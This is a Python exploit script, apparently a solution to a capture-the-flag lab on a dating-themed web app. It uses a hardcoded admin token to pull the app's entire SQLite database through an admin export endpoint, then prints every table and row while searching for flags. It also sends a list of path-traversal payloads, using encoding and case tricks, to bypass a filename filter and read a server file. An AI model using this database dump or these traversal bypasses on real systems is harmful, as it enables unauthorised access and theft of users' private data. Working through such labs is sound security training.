import requests, re, sqlite3, os

BASE = "http://10.112.165.127:5000"
API_KEY = "CUPID_MASTER_KEY_2024_XOXO"
FLAG_RE = re.compile(r"THM\{[^}]+\}")
DB_FILE = "valenfind_leak.db"

# Download the database
print("[1] Downloading database via /api/admin/export_db")
r = requests.get(f"{BASE}/api/admin/export_db",
                 headers={"X-Valentine-Token": API_KEY},
                 timeout=15)
print(f"  Status: {r.status_code}, Size: {len(r.content)} bytes")
print(f"  Content-Type: {r.headers.get('Content-Type', '?')}")

if r.status_code == 200 and len(r.content) > 100:
    with open(DB_FILE, "wb") as f:
        f.write(r.content)
    print(f"  Saved to {DB_FILE}")

    # Read the database
    print("\n[2] Reading database")
    conn = sqlite3.connect(DB_FILE)
    conn.row_factory = sqlite3.Row
    cur = conn.cursor()

    # List tables
    cur.execute("SELECT name FROM sqlite_master WHERE type='table'")
    tables = [row[0] for row in cur.fetchall()]
    print(f"  Tables: {tables}")

    for table in tables:
        print(f"\n  === {table} ===")
        cur.execute(f"SELECT * FROM {table}")
        rows = cur.fetchall()
        if rows:
            cols = [desc[0] for desc in cur.description]
            print(f"  Columns: {cols}")
            for row in rows:
                row_dict = dict(row)
                print(f"  {row_dict}")
                # Check for flags in all values
                for v in row_dict.values():
                    if v and isinstance(v, str):
                        for f in FLAG_RE.findall(v):
                            print(f"\n  [FLAG] {f}")

    conn.close()

    # Also scan raw bytes for flags
    print("\n[3] Scanning raw DB for flags")
    raw = r.content.decode("latin-1")
    for f in FLAG_RE.findall(raw):
        print(f"  [FLAG] {f}")
else:
    print(f"  Failed! Response: {r.text[:300]}")

# Also try reading seeder.py via path traversal bypass
print("\n[4] Trying to read seeder.py")
# The check is: if 'seeder.py' in layout_file
# Try unicode/encoding bypasses
for p in ["../../seeder%2Epy", "../.././seeder.py", "../../seeder.Py",
          "../../SEEDER.PY", "../../seeder.p%79"]:
    r = requests.get(f"{BASE}/api/fetch_layout", params={"layout": p}, timeout=5)
    if "Security Alert" not in r.text and "Error" not in r.text and len(r.text) > 50:
        print(f"  Bypass [{p}]: {r.text[:500]}")
        for f in FLAG_RE.findall(r.text):
            print(f"\n  [FLAG] {f}")
    else:
        short = r.text[:80]
        print(f"  [{p}] -> {short}")
